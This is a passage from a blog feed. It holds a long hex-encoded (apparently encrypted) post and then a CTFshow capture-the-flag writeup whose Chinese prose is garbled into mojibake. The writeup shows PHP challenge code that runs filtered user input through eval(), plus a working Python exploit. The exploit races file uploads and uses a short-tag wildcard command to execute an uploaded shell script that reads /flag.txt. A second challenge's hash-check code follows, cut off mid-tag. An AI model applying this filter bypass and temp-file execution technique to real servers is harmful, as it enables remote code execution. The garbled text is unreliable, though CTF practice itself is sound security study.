0395c54edbf9737bc68e862cf19421beeaa909907f587240c2d07e103bfec29ecf56e778ed775ee0133fc807b3cd42ae10f8f3898e0311ffc56c7c0e76f3fde9e8d2927a914915d726c34ab58f7433d9a68f49c58cae02cc19c3a3787770226b37e7d6473d498c764acf7160fae95f6ca1513567477676201931e2c58320c3c7513b281ca9b836800ff8da04d5c4c690fc445e262bb9173760c16ad0ede52acabbc5c392f978170639dac801868fe982b8697663aa9ec6ab37ebfe7617b9e376d5e07b84b32012c4b497bfa8984dfb6cd044ac540eeb42dd3f69e40a16b19ba4012bd71b6d2fa5b060261cd3db7a1b31bfc688d3946ead62d8af9ce674a8edc9503ed366e1e3fa779fed5fb0938deef2928d1d283cf9b22eaf2e96a7bc2c6c70b891156db6f87596aced039c28708961e6d4d071be31c7381a76ae28d57e53d9bcb5a53984dcc2c2f63e58e5c531a2654babf7cf076c7324623e7d123e7322a67b63828e775666245ae05600629b48b79237fce5a797d25ff9c08d5df618c0a7eb93bbd10aa22629fa78e40632456a0363b57119a6f0b2fb316fb098fed433245e426f5990f6abffbf58d2ee0bb886b3c4967bfc134f60d540866c5b5cc2de00ffcfa020683372bee3528045b50b099812acbc3f9dcefd3da1800b88d8fde5adbaa637fa359bae08fcad6b1cf043c37f38f98739245e1fccfdc80391b142fe72aa7b1abdf7930179dc3e129c0c310dea70d7583700b694f0b8978e6614e8e7f141ccc8c1ddb8242f69dbd633b2b6d7e527fd71a82c0314c6ac4fe51422b067b47ecea7ba5886bd83475b34ebbd04038eaa4ee374fae48066f0de475ea51908977ce2a67ef6d844b521fd91d84e45a80e72acffa9436afe653802b2f49986b2915d8d88c9d6bb32ee0e5de0435ac11045ea5339eb63f229cf3860b6a3de52360015c20af0a3e7c4529ce1c7e4b1a4913a8f60649c5a34a2a1eb495789c5e15142abecf551287196fa086fa90c3fc8ba5ac827e51d79025e9dc5a6d0ad874b8bf96152bf06d059f2231f04242add91d3a367e4eeec01d159fae72a84438f8b5ccde8de227eb06c15a72f6892d98ec85f5e80f566ea50404495f357702bee3a100c2cfc8c1c86bd59448baeca0d0210a22a4cb9ae64e96bf81a5d9d7e6319c87c9e14003fa8b1a8b9c7b1c1cb8b282eae33048c04b323f4b2b3929e9e21dfa3075c5fd54496f6a99a890f691baad0dc3607d5716635d27e0bd2a1ce5aa496b128c406349c1ab4324a95aa1ac883bebcd9088bb50ed8707f844853a0ac1cc40ca9b0cd1acb6efdce8119857e3cbd02d29e5f1e0c15e63a28db1ef50e5741530946472c6389b2a4ae71bfee0e0199ad0be9aec14b95afc88830d0484f8ecd09e00ec1c86acbb982c3fc16cd9202074f4fb04c65e7f24592f126e17d3927fd2c09620786436674ff7e7807c466cce9a955719d3711ff4cbf67e8726dca0011a00958e5464b5fae64b82910863ec432d2511355091c86ddaab79e0cf7bd370bc3bc2450c995ecb269e899884c3c0593c313438b54f4f2296777e9c320244e2291990a992cd092c12b6bd2c95b79e841c063c5e5a911a45d5bd6db166839dbc28aebcc9bf87af8b83722bfa8370c079991a1c5eb9f2dde972db12d59e5ae25e442c0a25878c86febb04926bb007eb02a3f128fcf059dc21751fdcf16150b928e96ad707b0ccd7cc961619fb2755897ea42ef1418cd0769439431a2549aaf1f5c2c4abe94c539175b3732f45b9640bed93cc9980c4994ffe2dd20ba1edbc3043b088a0a5846e26af68246362765daa892dfc3fc152089c5e4f7e4973a6e74baba2e96f1591afcacc2d4f0a4c9ac1d8a7c56f206afed893f9b5d617eba114935b91f060581aa1dc97735112b904baec9b7e67332fbb51fc903f84b1b371a9d390f9c852f806902e1e0e821ba54ce0320d41ca51d2d2652ee277293fd21b93a97ca206c814b9684640fbc02bacde3cbd1136b940c759f981e1d5b23da24ea5e37b298a9b5ff73ca9cd720a4d8ee97f8e028b559c526c1945786b40f8b2ef718b26943bd7a4d81a39cf0f4539f772a7ab2a7b0a4984ce23e9e3d266530a61d94db1bc544cf689a3458e8cac3bc6389518356f60d155c3ec6498ff4e5e218df2f56759d04d023ec091edc8ca5c9045fc17d1343a18e75c1c58c2a9f0c37b5c41b4639d07309d4d2d2f260644a2f1f56701649d6e948d0c66fc85c1cbc215e91fe628d4e48797ca2464ab87f11fba522041a48164d424ac8d9d5bd1e569c2e901ab380c474acab7aacfbd1f067ee33353ba11d5d302cc05eff3950f1f4c066ac6f034052cde76159c953c619f84f98f82ef6f0e1c92e3a0a8a1dacee64e81357705fdc572fe7d8a9323a0464037f4bcfa1ec20fe4df4c3feb6a19797f7773ec55c94c6eccea1cd53de5c02ab1c497efa66bee8a642aeef2bbf4b64d241fa7dea528f0b69e529e6183d366b051417ca3aab059dc66c2debcc5597c5f9c143588b5af314178c652e4fbe9bc1c6bee8edb01de0e00104c6fb2e1bc0b325305ba71241ac67a6e6a5a5cdf71187e57a31e289b3e6b1649135bc70c4461f6f364d259c970c54d11adc174e3fa5bce3db4f2da1c7d531f4916f7f4ad30e6ae60cf301fdeb34dfda59fbf25c98261ac4740d1db8e5dd136271cc2a47f933bb582b76a05e21c8e8956365d9e5d901b597450218ba281dff5fe989bd5554f8c79edc24b4a4a899c1f0593f204d7c5246b0716101d6067fbf1b162fbdc470fdea24cd3a4d450d465f057aadbb95a2871a4947a743a3cb662770cfb52e968125d72148938ab151bf0c2194d361174773db74325766a7c0d1497ffd6adf303beccbfeed46125d92b6e6a0f864a4533b63ec7cec40a5b67bbbbd5238796f005642e7d1ef166d7c8077eee94425fbb6129ec29292f4b6e95308949fbbe193b46519a5b7ea738bae3571fc4bde6f5ff15c3f9ce22dbc5d0f4b708a938bc82362ac8eb34cc7e06658539fff1a6db2f91cf1e07868d65f06d39407e61015e34263fb7a16d0638ff05de697326530f086c8c4a4a57e825992a36eeb45d56236f51074f57bdd101091dab2547f0348589d105dbaaf3eb189aadeba5a496e4283b75b0e47a339cf07ba0a5e4ff136e8c5cbd5ad6449b242b10d76b4d3a4c29f5633465517260e863d4653a877a89f8a398a26716b21b57034984bb8372ccd4c06a55ce9bb1c7c80dac2a5fa95aeeaff27c31ecee099ebd4081b54d4fc20c414c48f648fef74d5394ab8a6ae884d3f5fe0b770549d3d5927ef0d950639216cfee059c7515df8ec58151bd36dc1f4a4cf27a867269c0cd9d6f4fd5b531ef7311a78151675b35c8651ee1b9fc92f4cb554fe1716006978703f53d832f9f060e5257134f622e3f1439a7dd9ab7b02e6eeaed0165d2f4b89ab02787e3e498105345f7f610695503048ecf387cccbc641432fe4980f754cb5b74d70c876e876e2e214fef40ad4a31340b43c7c79c38609a3232a7f7f274361960be9b86a73191ed26b93e02b239e43ec8e08467afca9c699139834015ecabb0e28f29b0143b8dcd805b3a6e6967d94a9763fdf0305ef02975596395c7016507cf1b027a9029d3b68107b53f4d086b8c105c78bca1a7b8a5a5c9a7ed0b4ce50edbb7a350de65a96b1ba029f45d34dd12049f14f8dd86b712062ee29b631fe3c25e7c8aee3b6c24defc64c063032a53b4ba829ca58129d3b397dd7e790e6bc676e1d3636f673e87522112aa006301b4715599c8e8dab254177f7e25579f3f470bc87b7bab585d0bef714abcde1fdab48f7943c178da797a495441a2592b47a68257cc49157ecce87ae5d1be2013abedbb8ec9f4a3c3ac02fef57a1ef13678a5f5744340b67c6e63de802d958657dff90b2bcdd4247d84f84e36dd59231cdc74d2d89ebcab029593a420616eae06e09c38cf676c96e2930638e106a3150cf3d207b5c013e0d793b16bf69f590e4cc6b9f8a0d569cf10eda069efb336f657414bc287d1434c0bb6ad8fe8e8ab4be83e7acef5f20cfd05004003883182052c3118d0304a0f7726c4220357d5acca164dc0c226f0cf7c299ddf6dd7f5e955aba8fbca576e98b7287fe1eba7a1a6cc44d6fc27158764df4be9a8f9224a6e408ed92bd370acedb643e9dd12cdc03e4192fbc971b5b7db7723b112a85a08c072c949cabfe626d59f8fa98e22c5f1452521983f192d3c2450f893b6611773c5db7a43007d160d1e759bb313fa76cd0c69d025ebaf667e3e9e958c6e314dc6b195fb515f6974fb30393ceb8902c0fef130ecf34624e0505ae2afba0faefbdfceb879fc47fc99769bb69284c578bac8899853d56d2f67257003fbf4f87946be34ac32f2cd0a952b635cb6432e95430d837321ebc3a742292ac53c33cfe87cea6980b7a1261ad4944a8b1604e481783f1d0c08174e0223bd27033af7c634b4c1e0d4b7b583b9a4172f5490432a26667fc06cfb35cd4100f72341249dd5615c0850adc66b25a846d0d730cae2266ef8141395172f6f3b68e3bb0fb2e145e88518ee23e13561b46e92d618fd226c3050ad8ba12a65d4b295ce94a2eb75afdd36532560d23220dd3ab8ebf6fc9f2f60119cc26c49ce8fba3b7722caaef9b42810a53c99cc9733f705e53add6ff748fe6effd66b4240665395e538735c78aec55c20f6ab82bb0ce4e64a8846e1ae26d5752a19574b3e8ffb6ae111d6ecde664f75bcb68cbcb29058787b2a1a0ec5a852f06a0a2037262ee2243df2fed23a5eb30d7f9467f05ec7021a9d447d42703dcc7f945fbbb92b7dc28db84a98fbaca977bc060f960af394776f1cea274930ca3fca476a734d3ec9f2763ed900fd86f52cf490e51f7649b84f8a0c0bbf2e2d6c5e6ba6e172a80a78e44eb46d924744102a446d685690f4aa3cd1ea42cdce734a4b966a523a9c33b56dd8b802f9fd9b25d42230b82f7f6212e55e2d4b20577ed98505c4a1b58b676d1844880d56c7549be2a936f1ba40f5317264915be9f42584b63669cb188852a7624e2a950a85d75f4055d29389dac835905299abfc204807cd12a999fde3b6552275681f36d3eaff35bc8fa3cabb1cef5c90514f4d8519e5db76a7a4309d9da7bd23c97a7792e952887ea010a40d1a84ee09ac5436112fa4a41c769d159e1bb4d676a0da051e8220ed491a4324cbcc3c24a0ee07a7b12d4814475abdc73774b7055d25aec7121702d0e467c244ac138b6099c4788e09c4a8b19e53c27b3f77f69a1f99ff0bb488626a3ff2a9da86fa56d6ac978b2a649d7ad7f884a05a67a2f56802f53997c9ede963ca7633486e365ecf1439dac24b06474f236bd53a0d1529127200be47ab0f4e4feaa9cdfb092f56a47df7f66a135046f4d95d917b9854000c434a234daddaa190dc44df84ac0228296d7eab3a8f62bcd0d6acaf36d1753e267c772bb6a48aeaac9d095b60eb3924e26d339c789a302e852473b3a473f1dd4087a5ae84b0c474a72c651dfc3e06e7690c2aff5b6631d6c0269980e8f8cbf331e735e6527244e632fc0f0ad4d3ff919718a8182bf812973621861bffb9f67a393c8128b10f81ff18a185218b1c39e23bf8222f0086e775b1579ff1a82a46e8452b7fed8d5527ebc045d1c962de3dfae7ecdd4864bc161d1174b9d9dd30a861f9e2054991ce88945ff763996bba68ecdf2ed391e75f08c2710da71645954b69b709e6e34af6c474e7576b42c5176ce19807cd7dfb953a432176c88489ab214567d377e2439aaddd4f5ca57659670e6479865edfd7680f5357672f7b7005a869b08023159a476ace30ed68aff2b44c9b36abc141e3f7cfded5d23cd5d60ed53477006c0056591114a55ead630b08b127326c694178459df1ca553469e613a89c1d1c5cfaa398c2eab6d9acf16f47c78a42e158eb648201df604e858996c36a21963ef7dc4922c3c52c4fa89a7c9d4d7c372034dd019e0aec442f47619487abc1ed6794c4219e4378b5007d145c7189b9e9b059cff8fbca8a0281363c9c54fa99f1c1a7235e6d1c15d50486fe004061985aa5ca9d33e268cb69d85d7a0441e5001447198494abbf64b0b1af5de8196a14adc2db532e459563656a890596dc3b20803dcbfec1d7886a90672ea9bee6c777b028dea1e67b3e4d4711270cb386806b954500777b6583fe8992f2759652f6791250c13bb50a40ff758bf47f27dc70b3dd29656a61568e386faf2edc13b23d5f0bae1ba388cdc6b41aaadba42dac101770a9ef10f51e4dff3ec373982e95a773a425628b96eb45f5350a02f52d94c1924244e3ca600eb0dc8787864e532f51b7ff23d66a76bf15d785b1bd853e018819eeca454326ee80b46f886111b69c8e4f5b22743e77705b07a73252b5836d78ffa23d00a75e6edfde91fc7d122ed3b46746e862e0b531b3a0d1d55738fdf3163ab849d94280add40ceed3930a40a0f9b38f2bf57d46b04beabf893a6aec967f7ac6f77c160191438626418e991d28ca30cc5d597a2a600ae55fa5f2f0ec5a0bce53422c9eb371fc57fc4bc85ed50e50748bc3ed64bedec8df466d3e114be97d80a15db85c5c06671ff1f3972d7ccabfb5aa923ab4b11cadb804cd973c7747b80b4f6656d828b23f373f28d907fec7835af9d97a4c589d5bb08c8940605c71052b72f6621fd9d716163f9bb3879ee20061277187e9baefebbfc6f7983551f4964ffce9be726d85df5a7414565251d0779b70e5808b224dd13a3a485fc786fa2b0149fcc9e36af8bb01015f1a02b28a1cef83f2cd1f364bbe5accc41418b3ab97b056fd7fdd01a33709e04849d72ec902e7dfc8e16336b8350b6852374e5b8a96ba3d819f74058e9777f604e4da6fa3b4b121ae15fdaf03acc57e36fe624e57bc56d89cc76399b64ea897efe1e3ba37498e1e752161d6ff6a390510fe941549fea6c1dcdbcab86ac9b2156bb3674fafb7f9e61589314825638287a4f8bbe7c5747b500bb1bf9240d9c44c3dce6b7e2c9ae88e9fc8b8f2193266bdf568906c09dc4928f0a671bdf5796d8258ef0cea5650b526705d4af039a84173822d813a6191eb850736f8611c9880f2b7afb6de3c93f87b3f3227ed5a568cf8461de4db3909d3b49ec8689e35350c4c35f7c5ae44e651d2d5c249d88e08a6d435d80ae46c08d17c7329cea2e853c48f7bb92fddbec8d01b916f750df4b49e570b2d7b2b505a0cbd521b4e5e227c1dfd5e57c85d37a9826cac49ca3c797628e7d47b54b6824dab1984ba0746ae05f9f89b655d49d777870ef0d1a4d65b2b7359ae0422a645833c397ce458acd59a4a313ce75cf6e0b9c871ed4aeb4a19150bb7cc3355004c8c2f60d9e549d064cebdf4721ad3db579c29bbc3d534ef4bb789b006e4ac82da20c7cae447c995c90fe3e758654fcff7c0582657399d802ddbb5592fe1e31ea6ba74f4a7c3ded33b81fb625b3ea5d14199f3ee0eaeffd0d27807be2edfa2bbda9303758fb922af0db41a5d1f687ad6bcf42abee0af5f4b962609120f622b4662f95f118e5673b10ffc1d8b97e08e661d79c6564166c76563cec8ae68f72389580c87a0d99c50c94482b07ad4c03fe1cc18890bb9c4360691b18fd1b69f83106f94355c02470721123d5615142c6611bc5a81e6ab2adecce349aa0ba676c14cb8f84499b979f3ad8371582d123ac9d43f1965906428ba49397c63ec45d2b1f85c8d10ece908ca04de39de94908419d59b5b65945016afcedbe0039ad23c748694f4a8cf674b2e9604f185e6c6ee1286fb2751810e5fae3301d326680098c71aa38af8ce5727f30de12aa6e7bf10153afa14c9c643253a7b29301d714b5ea1d1fad0c5f1463a54ac91a7b09c104a8a17c7a70f93b6b4f23fd17b97b3a08dfa5605da2e217c22b570a50026ea53d35c09d511e155dfddc0ab45a28a181e08175054b90a8ca0bd6bb5f855e3f40c1e589acd865fe9975468e3d7eaa30a4371c6f0dbff0de85cbc3b4a432e88d848f2cdd82e269647ddd75d3ed7abee3c6c5d611f9083d52c4fcbfc5ed5cc0299e60976e74bc0461fd8a2e9d0e153c3a7fd36f149993847c7c50cba5d3648126cccd74c3c52ce9996a135be6cd0e5773faf3883680966a58a9e6b6dd6fe2d06bf7c76b3bb1c8f3d9d0e7d8d613a7035da9693611971bc45f395d623d69e70e5854cc99c6b1c442c31065431984c0fa0cd0925beb858f17e67f05554dc8a04e3e9bbdefd6ff6b79b1b42020482f7c98b7907ef94ee6324a77ae60235df49c711c46d32ded164bca68ecb2757b4331a4ed942f9df1c9dc21717b86de26f6366c877acc5180a54729f41e0fd150518d090f03b4fc87fa55424b25d5379f80ff8c7fa9218b143d1accbf64e0496507755896b7670ad90cbd2576b5a1a41ca9bcb3e5fe11f5695fc61ec4450f922816eb0482c5122bf562617a6ed7e3d30d58a06ee5b1a9c7efe303a69e2b78f6f4dd1953679ca0ecf51287c5dc368e5bc6c40fbde50c2642827685132080cf413ec3f5792323513bc81c193f06e44902b363ac7115bb73ab072476bd829e3fec89ba3ab0b23307b3ac96c04c6d9be1c3ff4596155994b6f0da196fb40bd359a9d69e3b8df577b72768becb44d22d8c9ddd6ebb267f707fea3e53ac88dcc0b15333b5aece5c063edad4f15c7b65f25dfd00438e11ff06c4c6724d158eff5a9ff197b2edba9ea58ed97890d095a16c0755c992b1ee45e92394772d598c9c454793121f2304bda725b660d446ccf9bf4f2e74d8ae88519e0a3f58258f2bfc528f313b310b5ca6dde8b1497a8fa4e07fff392838a1476a631113f2746838ac011251f683f42bd090f9dc27236c0135b029ca7bac011f8ce90d0dd42db7ed108cfb1d7974d93c6ebc8caf121b25a07c63c5e157529452f9c0894731d1010510b2ea0f9c5bcc51a7c1cba5ee66ad15447333178b65692a26cbadbdb64e438a6a03de88323074cad461f5c296c3f8b9529662c844a46766012248b4b19299bed554fb54b80eeed1d82c1ee531448ba54680ee9729639225e6b81038f42d1d33eca684112cc9963c9e99c79d059a1b7b6adee4a0f1a5b27b0c4c94656c6bfeacf68c6f660f77d99044937ed64ecd1280c46936af06500397cbcc5527da5dfd9143c2fbbdae1f60d33b9d08397c7547c0d78084131689a4d649795cf310079563340acb0a3c75e5f1f0b3c9d6f0bd3adffef15d1313bd8cb3c03f5f6678f477f59bac6573e974dfe1c15bc29be874b9188947573db307a4588d877a5bcff1eef9c875f3cb22bd9787636a39170257e69208327b149dff9025f7af4aaebc899b9d9e65d452ffc1d4313c3e2fafef6fadd2023de3f62f194287771af4747d61c798077e1495a0edff55913732f656e837dc8bea28be8b6b627590e9f712232631c2799cbfa55fdd889493fda55c2402a02f3e782dc37a81516042b64c87b25dced97234332d0665458e5d1647fcf2971aa9a6e7f2846b124e1e4a8192216263fe7cc9676292e55e232f34d5e03f9f1ba7dc683dcb6d2aef2042bc8b94be45091253d07f95d1786da129ebabfb47db502b4ea6f94cff58bd58f97a2a594d24353200a8836aff23590ba6612879bc2d6b325c292185a3b6e853d3323ff1bdc890df255eab45205ed4e3f181d0194233589496284b7b42c7f048d42ca330d0061e4c1eaa741f89f006c4ee22ef27472517951d459908eb7f419b1c8694ab58eb259b689732685fa48952e7be987d44f00abfb3793d3387ff9fc3a223346be6019ca2a52c57f64fb375e1b4114dbc679a7ee4d92741a6c84a715ca325767d868ddd5282b008526ab9f041c0d2b79e72663792570968fdf8caad50f538b7b7ad180e5939281fc7244f18245cb2fc2b99f5a32ab2c79a70975caef423d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowéƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/"/>
      <url>2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ctfshowä¸Šéƒ¨åˆ†é¢˜ç›®çš„writeupï¼</p><a id="more"></a><h2 id="çº¢åŒ…é¢˜"><a href="#çº¢åŒ…é¢˜" class="headerlink" title="çº¢åŒ…é¢˜"></a>çº¢åŒ…é¢˜</h2><h3 id="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬äºŒå¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"></a>çº¢åŒ…é¢˜ç¬¬äºŒå¼¹</h3><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°hintï¼Œè®¿é—®å‘ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    $cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ç¬¬ä¸€æ¬¡æƒ³åˆ°çš„æ˜¯phpæ­£åˆ™å›æº¯ï¼Œç„¶è€Œä¸æ˜¯ï¼Œä¸ç»•å¼¯å­</p><p>è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ï¼Œä½†å‘ç°<code>./&lt;&gt;?p</code>ä»¥åŠåå¼•å·å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œè¿™é‡Œå°±è¦ä»‹ç»ä¸€ä¸ªæ¦‚å¿µphpä¸´æ—¶æ–‡ä»¶</p><p>æ–‡ä»¶è¢«ä¸Šä¼ åï¼Œé»˜è®¤ä¼šè¢«å­˜å‚¨åˆ°æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•ä¸­ï¼Œè¯¥ä¸´æ—¶ç›®å½•ç”±php.iniçš„<code>upload_tmp_dir</code>å±æ€§æŒ‡å®š</p><p>åœ¨ä¸Šä¼ å­˜å‚¨åˆ°ä¸´æ—¶ç›®å½•åï¼Œä¸´æ—¶æ–‡ä»¶å‘½åçš„è§„åˆ™ï¼šé»˜è®¤ä¸º php+4æˆ–è€…6ä½éšæœºæ•°å­—å’Œå¤§å°å†™å­—æ¯</p><p>å› æ­¤æˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç»•è¿‡ç”¨é€šé…ç¬¦å’ŒçŸ­æ ‡ç­¾æ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;&#x27;</span><span class="comment">#åŠ å·ç”¨æ¥åˆ†éš”ä¹Ÿå¯ä»¥ç”¨ç©ºæ ¼ï¼ŒçŸ­æ ‡ç­¾çš„ååŠéƒ¨åˆ†å¯ä»¥ä¸åŠ </span></span><br><span class="line">url=<span class="string">&#x27;http://7653b365-217d-4cd7-91c9-e620b64e0638.challenges.ctf.show/&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">files=&#123;</span><br><span class="line"><span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;#!/bin/sh\necho 1433223\nls /\ncat /flag.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">r=requests.get(url1)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;1433223&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=post,args=()).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">threading.Thread(target=req,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬å…­å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"></a>çº¢åŒ…é¢˜ç¬¬å…­å¼¹</h3><p>hintæç¤ºä¸æ˜¯sqlæ³¨å…¥ï¼Œè¦æ‰¾æºç ï¼Œdirsearchæ‰«ç›®å½•å‘ç°</p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/TIMæˆªå›¾20200217222027.png"><p><code>www.zip</code>é‡Œæœ‰<code>check.php</code>çš„å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params">$receiveFile</span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    $streamData = <span class="keyword">isset</span>($GLOBALS[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? $GLOBALS[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($streamData))&#123;</span><br><span class="line">        $streamData = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>($streamData!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        $ret = file_put_contents($receiveFile, $streamData, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $ret = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ret;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5(date(<span class="string">&quot;i&quot;</span>)) === $token)&#123;</span><br><span class="line"></span><br><span class="line">$receiveFile = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">receiveStreamFile($receiveFile);</span><br><span class="line"><span class="keyword">if</span>(md5_file($receiveFile)===md5_file(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(hash_file(<span class="string">&quot;sha512&quot;</span>,$receiveFile)!=hash_file(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">$ret[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;äººè„¸è¯†åˆ«æˆåŠŸ!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">$ret[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$ret[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode($ret);</span><br><span class="line"><span 